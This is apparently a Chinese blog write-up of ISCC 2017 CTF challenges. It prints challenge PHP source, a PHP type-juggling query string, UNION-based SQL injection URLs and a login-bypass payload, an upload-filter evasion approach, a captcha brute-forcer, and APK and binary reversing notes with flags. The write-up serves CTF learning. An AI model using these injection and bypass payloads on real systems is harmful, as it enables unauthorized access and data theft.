<h3 id="自相矛盾"><a href="#自相矛盾" class="headerlink" title="自相矛盾"></a>自相矛盾</h3><p><img src="http://i2.muimg.com/567571/039172265d7f00c3.png" alt=""><br>源码见到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'iscc'</span>]); </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"bar2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line"></div><div class="line">    &#125;	</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">    <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">		</div><div class="line">        eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>].$d), <span class="string">"isccctf2017"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">		</div><div class="line">    &#125;</div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; </div><div class="line">   </div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>是有关弱类型的、弱类型的分析之前已经写过。</p>
<p>可以看出iscc是一个jason对象。<br>bar1要求里边元素第一个比2016大而且不能是数字, 这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 bar1为2017a即可<br>bar2是一个数组，长度是5，里边第一个元素是数组。bar2为[[0],0,1,2,3]即可</p>
<p>而array和string进行strcmp比较的时候会返回一个null，%00可以截断eregi。cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00<br>最后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?iscc=&#123;%22bar1%22:%222017e%22,%22bar2%22:[[1],1,2,3,0]&#125;&amp;cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00</div></pre></td></tr></table></figure></p>
<p>flag为：<code>flag{sfklljljdstuaft}</code></p>
<h3 id="I-have-a-jpg-i-upload-a-txt"><a href="#I-have-a-jpg-i-upload-a-txt" class="headerlink" title="I have a jpg,i upload a txt."></a>I have a jpg,i upload a txt.</h3><p><img src="https://ooo.0o0.ooo/2017/05/05/590c049461a67.png" alt="1.png"><br>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt; </div><div class="line">&lt;body&gt; </div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> <span class="string">'hanshu.php'</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])) </div><div class="line">&#123; </div><div class="line">    $do=$_GET[<span class="string">'do'</span>]; </div><div class="line">    <span class="keyword">if</span>($do==upload) </div><div class="line">    &#123; </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) </div><div class="line">        &#123; </div><div class="line">            $html1=&lt;&lt;&lt;HTML1 </div><div class="line">            &lt;form action=<span class="string">"index.php?do=upload"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">            &lt;input type=<span class="string">"file"</span> name=<span class="string">"filename"</span>&gt;                  </div><div class="line">            &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt; </div><div class="line">            &lt;/form&gt; </div><div class="line">HTML1; </div><div class="line">            <span class="keyword">echo</span> $html1; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">        &#123;   $file=@file_get_contents($_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>]); </div><div class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>($file)) </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">die</span>(<span class="string">'do you upload a file?'</span>); </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">if</span>((strpos($file,<span class="string">'&lt;?'</span>)&gt;<span class="number">-1</span>)||(strpos($file,<span class="string">'?&gt;'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'php'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'&lt;script'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'&lt;/script'</span>)&gt;<span class="number">-1</span>)) </div><div class="line">                &#123; </div><div class="line">                    <span class="keyword">die</span>(<span class="string">'you can\' upload this!'</span>); </div><div class="line">                &#125; </div><div class="line">                <span class="keyword">else</span> </div><div class="line">                &#123; </div><div class="line">                    $rand=mt_rand(); </div><div class="line">                    $path=<span class="string">'/var/www/html/web-03/uploads/'</span>.$rand.<span class="string">'.txt'</span>; </div><div class="line">                    file_put_contents($path, $file); </div><div class="line">                    <span class="keyword">echo</span> <span class="string">'your upload success!./uploads/'</span>.$rand.<span class="string">'.txt'</span>; </div><div class="line">                &#125; </div><div class="line">            &#125; </div><div class="line">             </div><div class="line">        &#125; </div><div class="line">         </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">elseif</span>($do==rename) </div><div class="line">    &#123; </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'re'</span>])) </div><div class="line">        &#123; </div><div class="line">            $re=$_GET[<span class="string">'re'</span>]; </div><div class="line">            $re2=@unserialize(base64_decode(unKaIsA($re,<span class="number">6</span>))); </div><div class="line">            <span class="keyword">if</span>(is_array($re2)) </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">if</span>(count($re2)==<span class="number">2</span>) </div><div class="line">                &#123;    </div><div class="line">                    $rename=<span class="string">'txt'</span>; </div><div class="line">                    $rand=mt_rand(); </div><div class="line">                    $fp=fopen(<span class="string">'./uploads/'</span>.$rand.<span class="string">'.txt'</span>,<span class="string">'w'</span>); </div><div class="line">                    <span class="keyword">foreach</span>($re2 <span class="keyword">as</span> $key=&gt;$value) </div><div class="line">                    &#123; </div><div class="line">                        <span class="keyword">if</span>($key==<span class="number">0</span>) </div><div class="line">                        &#123; </div><div class="line">                            $rename=$value; </div><div class="line">                        &#125; </div><div class="line">                        <span class="keyword">else</span> </div><div class="line">                        &#123; </div><div class="line">                            <span class="keyword">if</span>(file_exists(<span class="string">'./uploads/'</span>.$value.<span class="string">'.txt'</span>)&amp;&amp;is_numeric($value)) </div><div class="line">                            &#123; </div><div class="line">                                $file=file_get_contents(<span class="string">'./uploads/'</span>.$value.<span class="string">'.txt'</span>); </div><div class="line">                                fwrite($fp,$file); </div><div class="line">                            &#125; </div><div class="line">                        &#125; </div><div class="line">                    &#125; </div><div class="line">                    fclose($fp); </div><div class="line">                    waf($rand,$rename); </div><div class="line">                    rename(<span class="string">'./uploads/'</span>.$rand.<span class="string">'.txt'</span>,<span class="string">'./uploads/'</span>.$rand.<span class="string">'.'</span>.$rename); </div><div class="line">                    <span class="keyword">echo</span> <span class="string">"you success rename!./uploads/$rand.$rename"</span>; </div><div class="line">                &#125; </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">echo</span> <span class="string">'please not hack me!'</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'filetype'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) </div><div class="line">        &#123; </div><div class="line">            $filetype=$_POST[<span class="string">'filetype'</span>]; </div><div class="line">            $filename=$_POST[<span class="string">'filename'</span>]; </div><div class="line">            <span class="keyword">if</span>((($filetype==<span class="string">'jpg'</span>)||($filetype==<span class="string">'png'</span>)||($filetype==<span class="string">'gif'</span>))&amp;&amp;is_numeric($filename)) </div><div class="line">            &#123;    </div><div class="line">                $re=KaIsA(base64_encode(serialize(<span class="keyword">array</span>($filetype,$filename))),<span class="number">6</span>); </div><div class="line">                header(<span class="string">"Location:index.php?do=rename&amp;re=$re"</span>); </div><div class="line">                <span class="keyword">exit</span>(); </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">echo</span> <span class="string">'you do something wrong'</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">        &#123; </div><div class="line">            $html2=&lt;&lt;&lt;HTML2 </div><div class="line">            &lt;form action=<span class="string">"index.php?do=rename"</span> method=<span class="string">"post"</span>&gt;           </div><div class="line">filetype: &lt;input type=<span class="string">"text"</span> name=<span class="string">"filetype"</span> /&gt; please input the your file<span class="string">'s type </span></div><div class="line"><span class="string">&lt;/br&gt; </span></div><div class="line"><span class="string">filename: &lt;input type="text" name="filename" /&gt; please input your file'</span>s numeric name,like <span class="number">12345678</span> </div><div class="line">&lt;/br&gt; </div><div class="line">&lt;input type=<span class="string">"submit"</span> /&gt; </div><div class="line">&lt;/form&gt; </div><div class="line">HTML2; </div><div class="line">            <span class="keyword">echo</span> $html2; </div><div class="line">             </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">     </div><div class="line">&#125; </div><div class="line"><span class="keyword">else</span> </div><div class="line">&#123;    </div><div class="line">    show_source(<span class="keyword">__FILE__</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>这道题就做得吐血了。</p>
<p>先来读一下代码</p>
<h4 id="上传部分。"><a href="#上传部分。" class="headerlink" title="上传部分。"></a>上传部分。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if((strpos($file,&apos;&lt;?&apos;)&gt;-1)||(strpos($file,&apos;?&gt;&apos;)&gt;-1)||(stripos($file,&apos;php&apos;)&gt;-1)||(stripos($file,&apos;&lt;script&apos;)&gt;-1)||(stripos($file,&apos;&lt;/script&apos;)&gt;-1))</div></pre></td></tr></table></figure>
<p>上传的里面不能包含有这一些参数，这里的办法就是拆开上传，比如是这样的。<br><img src="https://ooo.0o0.ooo/2017/05/06/590dd22924538.png" alt="1.png"><br>而接下来遇到的问题就是该如何合并这些参数。</p>
<h4 id="rename部分"><a href="#rename部分" class="headerlink" title="rename部分"></a>rename部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$re2=@unserialize(base64_decode(unKaIsA($re,6)))</div><div class="line">&gt;&gt;&gt;&gt;&gt;</div><div class="line">$re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6);</div></pre></td></tr></table></figure>
<p>要算出那个加密串才行。而相对应的解密脚本为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 获取凯撒位移6的加密内容</span></div><div class="line">    kaisa_6 = kaisa(string,<span class="number">6</span>)</div><div class="line">    <span class="comment"># 获取凯撒位移20的加密内容</span></div><div class="line">    kaisa_20 = kaisa(string,<span class="number">20</span>)</div><div class="line"></div><div class="line">    code = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(kaisa_6)):</div><div class="line">        kaisa_6_ord = ord(kaisa_6[x])</div><div class="line">        kaisa_20_ord = ord(kaisa_20[x])</div><div class="line"></div><div class="line">        <span class="comment">#判断凯撒位移20的是否是小写的值，是的话就加上</span></div><div class="line">        <span class="keyword">if</span> kaisa_20_ord &gt;= <span class="number">97</span> <span class="keyword">and</span> kaisa_20_ord &lt;= <span class="number">122</span>:</div><div class="line">            code += str(kaisa_20[x])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            code += str(kaisa_6[x])</div><div class="line">    <span class="keyword">return</span> code</div></pre></td></tr></table></figure></p>
<p>卡住了。</p>
<p>大佬提示<code>foreach</code>是关键，又是一脸懵逼。再继续。<br><img src="https://ooo.0o0.ooo/2017/05/06/590ddee340102.png" alt="12.png"><br>这里就解决了开始分开上传的合并问题。<br>最后<br><img src="https://ooo.0o0.ooo/2017/05/06/590ddc3c951c1.png" alt="1.png"><br>flag为<code>flag{54a5bd4fe6193580020487b56acff6c5}</code><br>这道题主要还是这个加密的问题。<a href="http://pan.baidu.com/s/1mh8O3jy" target="_blank" rel="external">exp地址链接 </a> 密码：7lcu<br>最后附上一个比我这个好的<a href="http://amyang.xyz/post/ISCC-2017%20Web%20Writeup" target="_blank" rel="external">writeup</a></p>
<h3 id="Web签到题，来和我换flag啊！"><a href="#Web签到题，来和我换flag啊！" class="headerlink" title="Web签到题，来和我换flag啊！"></a>Web签到题，来和我换flag啊！</h3><p><img src="http://i4.buimg.com/588926/25dae4b8f0805552.png" alt=""></p>
<p>根据提示来就可以了。<br><img src="http://i4.buimg.com/588926/dc0a1c3542dcf00d.png" alt=""><br>flag为<code>f1ag: {N0w_go1Odo!otherw3b}</code></p>
<h3 id="我们一起来日站"><a href="#我们一起来日站" class="headerlink" title="我们一起来日站"></a>我们一起来日站</h3><p><img src="http://i2.muimg.com/588926/3f67399745e8473d.png" alt=""><br>点击链接进去发现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">老司机们平时都是怎么日站的呢？</div><div class="line"></div><div class="line">试着进入后台获取管理员权限吧。</div></pre></td></tr></table></figure></p>
<p>看到老司机，那就先看下<code>robots.txt</code>。出现了<br><img src="http://i4.buimg.com/588926/4f6a4265ca4b5960.png" alt=""><br>里面这一串<code>md5</code>加密一看就是<code>admin</code><br>访问提示要继续寻找admin管理页面。<br>猜测是<code>admin.php</code>，就出现了后台登陆页面、<br>尝试弱口令，提示密码错误。尝试万能密码。<br><img src="http://i2.muimg.com/588926/560f104b8814acbf.png" alt=""><br>flag为<code>Flag:{ar32wefafafqw325t4rqfcafas}</code></p>
<h3 id="where-is-your-flag"><a href="#where-is-your-flag" class="headerlink" title="where is your flag"></a>where is your flag</h3><p><img src="http://i2.muimg.com/588926/874ae02a1819118f.png" alt=""><br>使用sqlmap可以直接跑出来<br>或者手工。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.129.108.53:6980/web-08/?id=%df%27%20union%20select%201,unhex(hex(thisisflag))%20from%20flag%20limit%201--+</div></pre></td></tr></table></figure></p>
<p>flag为<code>flag:{441b7fa1617307be9632263a4497871e}</code></p>
<h3 id="Simple-sqli"><a href="#Simple-sqli" class="headerlink" title="Simple sqli"></a>Simple sqli</h3><p><img src="https://ooo.0o0.ooo/2017/05/23/5923fb7490f27.png" alt="捕获.PNG"><br>是一个登陆框，这道题加了验证码。<br>这种题目得常规的判断逻辑应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select username from admin where username=&apos;&apos;;</div></pre></td></tr></table></figure></p>
<p>如果数据库中的密码和输入的密码一样则登陆成功<br>然后尝试<code>&#39;union select &#39;1&#39;#</code><br>提示密码错误。<br>再尝试<br><img src="https://ooo.0o0.ooo/2017/05/23/5923fbe3aed18.png" alt="捕获.PNG"><br>最后payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;union select md5(1)#</div><div class="line">密码填写1</div></pre></td></tr></table></figure></p>
<p>关于验证码，ctf中经常用MD5的截断比较做验证，如:substr(md5(captcha), 0, 3)=’a85’,通过这种方式限制脚本的自动化攻击。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">@$demo=$_GET[<span class="string">'demo'</span>];</div><div class="line">$i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line"><span class="keyword">if</span> (substr(md5($i), <span class="number">0</span>, <span class="number">3</span>)===$demo) </div><div class="line">	&#123;<span class="keyword">echo</span> $i;<span class="keyword">die</span>;&#125;</div><div class="line">$i++;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>python版本网上有的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import hashlib</div><div class="line">def md5(s):</div><div class="line">	return hashlib.md5(s).hexdigest()</div><div class="line">for i in range(1, 9999):</div><div class="line">	if md5(str(i)).startswith(&apos;a85&apos;):</div><div class="line">		print i</div></pre></td></tr></table></figure></p>
<p>最后效果<br><img src="https://ooo.0o0.ooo/2017/05/23/592404186ed97.gif" alt="GIF.gif"></p>
<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>这道题刚做出来就被下架了，分数清零。<br>题目本是反序列化的题目，但是可能是出题人头很铁.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.129.108.53:5555/index.php?select=0 and 1=2 union select flag from selct&amp;time=1</div></pre></td></tr></table></figure></p>
<p>这样就可以解出来了。</p>
<h2 id="Moblie"><a href="#Moblie" class="headerlink" title="Moblie"></a>Moblie</h2><h3 id="简单到不行"><a href="#简单到不行" class="headerlink" title="简单到不行"></a>简单到不行</h3><p><img src="http://i2.muimg.com/588926/46c9bbc14be5efc5.png" alt=""><br><a href="http://pan.baidu.com/s/1hs9mIaS" target="_blank" rel="external">附件链接</a>： 密码：hd1q</p>
<p>这里使用 jeb 进行 APK 的反编译<br>直接将 APK 拖入窗口左边的工程栏目 , 就会自动进行反编译<br><img src="http://i4.buimg.com/588926/61b6efce329c7cea.png" alt=""><br>根据对代码的分析可以知道 , 这个安卓应用有两个控件 ：<br>一个 EditText 用于接收用户输入 , 另一个 Button 用于检验用户输入是否合法<br>继续往下看<br>发现应用要调用<code>JNI</code>层的函数 : checkFlag，再用IDA打开相关的so文件主要函数如下<br><img src="http://i2.muimg.com/588926/64b0256dcfee034d.png" alt=""><br>这里反编译成的 c 代码在有的地方似乎存在一点问题 , 如果发现某些地方比较诡异的话<br>再回去看看汇编基本上就可以明白了。而在这个checkFlag函数中，</p>
<p>主要是将传入的字符串使用了 <code>malloc</code> 重新复制了一份<br>算法的意思是 :<br>将用户输入的字符串按照长度分割成两半<br>把前一半字符串中的字符按照从左到右的顺序取出来 , ASCII码减去 5 , 然后与后半个字符串与之对应的位置进行交换<br>举个例子 :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">用户输入的字符串 str = &quot;8793245632&quot;</div><div class="line">分成两半 :</div><div class="line">前一半为 : &quot;87932&quot;</div><div class="line">后一半为 : &quot;45632&quot;</div><div class="line">对前一半的所有字符 , 从左向右取 , 第一个取到的是 8 , ASCII - 5 , 变成字符 3 , 然后与后半个字符串的对应位置 (也就是 &apos;2&apos; ) 的位置进行交换</div><div class="line">那么这一次变换得到的结果就是 :</div><div class="line">str = &quot;279324563&quot;</div></pre></td></tr></table></figure></p>
<p>那么这个算法总结一下的话 , 其实可以这样理解 :<br><code>首先将整个字符串倒序 , 然后将后半个字符串的每一个字符ASCII都减去 5</code><br>再往下看。处理完用户输入的字符串的时候 , 进行的操作是 :<br>将用户处理完的结果和程序中已经存在的一段数据逐字符进行对比 , 对比如果完全一致就返回 1 , 反之就 return 0</p>
<p>从so文件中找到字符串为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=0HWYl1SE5UQWFfN?I+PEo.UcshU</div></pre></td></tr></table></figure></p>
<p>那我们就是先将这个密文倒序再将前半部分的ASCII码全部加上5。<br>将得到的base64进行解密即可。<br><img src="https://ooo.0o0.ooo/2017/05/11/5914749e14a48.png" alt="1.png"></p>
<h3 id="突破！征服"><a href="#突破！征服" class="headerlink" title="突破！征服!"></a>突破！征服!</h3><p><img src="http://i2.muimg.com/588926/8211544b8942b5f2.png" alt=""><br><a href="http://pan.baidu.com/s/1skMl41B" target="_blank" rel="external">附件链接</a>： 密码：7nx1</p>
<p>flag：<code>6ae379eaf3ccada5</code></p>
<h3 id="再来一次"><a href="#再来一次" class="headerlink" title="再来一次"></a>再来一次</h3><p><img src="https://ooo.0o0.ooo/2017/05/22/5923034d8868e.png" alt="1.png"><br><a href="http://pan.baidu.com/s/1slCsKrV" target="_blank" rel="external">附件链接</a>： 密码：20y5<br><img src="https://ooo.0o0.ooo/2017/05/24/59256f995bf41.png" alt="1.png"><br>flag{ISCCXiaoTianShi}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="你猜"><a href="#你猜" class="headerlink" title="你猜"></a>你猜</h3><p><a href="http://pan.baidu.com/s/1pLHgjMj" target="_blank" rel="external">附件链接</a>： 密码：k3g0<br>一度怀疑我这个IDA是假的，显示的不是<code>main函数</code>。。。（后来问了逆向大兄弟，是因为在编译时去掉了符号表，在高版本自带的sig信号文件可以识别出）<br><img src="http://i4.buimg.com/588926/2b7f8eb4d3a0c6ae.png" alt=""><br>从main函数来看，这个程序出现了两个验证。</p>
<h4 id="验证-I"><a href="#验证-I" class="headerlink" title="验证 I"></a>验证 I</h4><p><img src="http://i4.buimg.com/588926/0381e706044ec96b.png" alt=""><br>在IDA中，使用<code>R</code>能快速的将ASCII码转换成字符串，所以V5至V14依次为<code>l1nuxcrack</code><br>而根据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 4; ++i )</div><div class="line">&#123;</div><div class="line">  if ( *(_BYTE *)(*(_QWORD *)(a1 + 8) + i) != *(&amp;v5 + i) )</div><div class="line">  &#123;</div><div class="line">    result = 1LL;</div><div class="line">    goto LABEL_12;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这是对<code>l1nux</code>的验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">for ( j = 0; j &lt;= 4; ++j )</div><div class="line">&#123;</div><div class="line">  if ( *(_BYTE *)(*(_QWORD *)(a1 + 16) + j) != *(&amp;v10 + j) )</div><div class="line">  &#123;</div><div class="line">    result = 1LL;</div><div class="line">    goto LABEL_12;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这是对<code>crack</code>的验证<br>所以这部分代码可以断定第一个和第二个字符串分别为<code>l1nux</code>和<code>crack</code></p>
<h4 id="验证-II"><a href="#验证-II" class="headerlink" title="验证 II"></a>验证 II</h4><p>回过来对第二个验证分析，看一下函数<br><img src="http://i4.buimg.com/588926/f190f0a6f17ced41.png" alt=""><br>和前面分析过的函数差别不大，只是 ASCII 码的判断 , 进行简单的加减法就可以推算出第三个 password</p>
<blockquote>
<p>73,76,67,70,33==ILCF!</p>
</blockquote>
<p>flag{l1nux_crack_ILCF!}</p>
<h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p><a href="http://pan.baidu.com/s/1i5geAFj" target="_blank" rel="external">附件链接</a>： 密码：9305<br>有点小幸运，直接看到了验证函数。再换算,将各个字符进行位置调整。<br><img src="http://i4.buimg.com/588926/1c916da4ed6c077b.png" alt=""><br>flag{1t.is.5O.easy}</p>
<h3 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h3><p><a href="http://pan.baidu.com/s/1qXCKnJe" target="_blank" rel="external">附件链接</a>： 密码：7ugp<br>下载打开，是个EXE文件，估计着要脱壳。<br>运行提示<code>try again!</code>，扔进IDA。然后就没然后了，等小伙伴分析分析。<br>flag{thx_4_your_register}</p>
